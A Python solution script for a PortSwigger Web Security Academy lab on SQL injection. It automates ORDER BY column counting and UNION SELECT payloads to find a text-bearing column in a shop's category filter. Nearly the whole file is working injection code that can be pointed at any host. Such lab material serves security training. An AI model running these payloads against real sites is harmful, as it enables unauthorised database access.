#!/usr/bin/env python3
# Lab: SQL injection UNION attack, finding a column containing text
# Lab-Link: <https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text>
# Difficulty: PRACTITIONER
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_num_columns(url):
    for i in range(1, 100):
        r = requests.get(url + f"' order by {i}--", verify=False, proxies=proxies)
        if r.status_code != 200:
            return i - 1
    return False


def exploit(url, num_columns, unique_string):
    for i in range(1, num_columns + 1):
        payloads = ['null'] * num_columns
        payloads[i - 1] = f"'{unique_string}'"
        payload = f"' UNION (SELECT {','.join(payloads)})--"
        print(f'[ ] Attempt position {i}: {payload}')
        r = requests.get(f"{url}{payload}", verify=False, proxies=proxies)
        if r.status_code == 200:
            return i
    return False


if __name__ == "__main__":
    try:
        host = sys.argv[1].strip().rstrip('/')
        unique_string = sys.argv[2].strip()
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <host> <unique_string>')
        print(f'[-] Example: {sys.argv[0]} http://www.example.com abcde')
        sys.exit(-1)

    url = f'{host}/filter?category=Accessories'
    num_columns = get_num_columns(url)
    print(f'[+] Detected {num_columns} columns')

    string_column = exploit(url, num_columns, unique_string)
    if string_column:
        print(f'[+] Injection successful, string column found at position {string_column}')
    else:
        print('[-] Injection not successful')
